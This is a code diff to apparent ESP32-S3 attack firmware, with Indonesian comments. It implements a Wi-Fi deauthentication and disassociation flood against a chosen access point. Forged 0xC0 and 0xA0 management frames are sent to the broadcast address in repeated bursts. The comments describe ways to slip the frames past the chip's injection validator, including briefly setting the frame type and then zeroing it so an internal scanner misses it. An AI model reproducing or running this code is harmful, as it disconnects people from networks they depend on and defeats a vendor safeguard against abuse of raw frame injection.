@@ -47,8 +47,8 @@ const char* rickRollLyrics[] = {
 
 
 // --- TEMPLATE PAKET ALA GHOST-ESP ---
-uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
-uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+uint8_t deauthFrame[26] = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+uint8_t disasFrame[26]  = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 
 
 
@@ -104,50 +104,50 @@ void loopWiFi(void * pvParameters) {
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
     // Pindahin ke luar biar mandiri Cok!
-        else if (isDeauthing && adaTarget) {
-        if (!deauthUdahSetup) {
-            esp_wifi_stop();
-            // Rahasia S3: Mode NULL dulu baru APSTA buat nge-flush validator
-            esp_wifi_set_mode(WIFI_MODE_NULL); 
-            esp_wifi_set_mode(WIFI_MODE_APSTA); 
-            esp_wifi_start();
-            
-            esp_wifi_set_ps(WIFI_PS_NONE); // MATIIN TOTAL POWER SAVE
-            esp_wifi_set_promiscuous(true);
-            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-            deauthUdahSetup = true;
-        }
+            else if (isDeauthing && adaTarget) {
+      if (!deauthUdahSetup) {
+        esp_wifi_stop();
+        esp_wifi_set_mode(WIFI_MODE_APSTA); // S3 lebih "bocor" di mode APSTA
+        esp_wifi_start();
+        esp_wifi_set_ps(WIFI_PS_NONE); // WAJIB MATIIN POWER SAVE
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+        deauthUdahSetup = true;
+      }
 
-        uint8_t apMac[6];
-        stringToMac(targetTerkunci.mac, apMac);
-        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+      uint8_t apMac[6];
+      stringToMac(targetTerkunci.mac, apMac);
+      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-        for (int b = 0; b < 60; b++) {
-            uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
-            
-            // PAKET 1: DEAUTH (0xC0)
-            uint8_t packet[26];
-            memcpy(packet, deauthFrame, 26);
-            packet[0] = 0xc0; 
-            memcpy(&packet[4], broadcast, 6);
-            memcpy(&packet[10], apMac, 6);
-            memcpy(&packet[16], apMac, 6);
-            packet[22] = seq & 0xFF;
-            packet[23] = (seq >> 8) & 0xFF;
-            packet[24] = 0x01; // Reason code: Unspecified
+      for (int b = 0; b < 60; b++) {
+        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+        
+        // SUNTIK NILAI PAS MAU NEMBAK DOANG
+        deauthFrame[0] = 0xc0; // Deauth
+        memcpy(&deauthFrame[4], broadcast, 6);
+        memcpy(&deauthFrame[10], apMac, 6);
+        memcpy(&deauthFrame[16], apMac, 6);
+        deauthFrame[22] = seq & 0xFF;
+        deauthFrame[23] = (seq >> 8) & 0xFF;
 
-            // INI TRIKNYA: Tembak lewat WIFI_IF_AP tapi pake en_sys_seq = TRUE
-            // Dan kita tambahin delay micro agar hardware bisa napas
-            esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, true); 
-            delayMicroseconds(100);
+        // TEKNIK DISASSN (Sering lolos filter hardware S3 dibanding deauth)
+        uint8_t disasPacket[26];
+        memcpy(disasPacket, deauthFrame, 26);
+        disasPacket[0] = 0xa0; // Change to Disassoc
 
-            // PAKET 2: DISASSOC (0xA0) - Ini sering lolos filter S3
-            packet[0] = 0xa0;
-            esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, true);
-            delayMicroseconds(100);
-        }
-        vTaskDelay(1 / portTICK_PERIOD_MS);
+        // TEMBAK PAKE en_sys_seq = true (Hardware Hijack)
+        // Interface STA biasanya lebih "longgar" validatornya
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true); 
+        esp_wifi_80211_tx(WIFI_IF_STA, disasPacket, 26, true);
+
+        // BALIKIN KE NOL BIAR GAK KEDETECT SCANNER INTERNAL
+        deauthFrame[0] = 0x00; 
+        
+        delayMicroseconds(100);
+      }
+      vTaskDelay(1 / portTICK_PERIOD_MS);
     }
+
 
 
     // --- 4. CLEANUP (MATIIN RADIO KALO GAK DIPAKE) ---
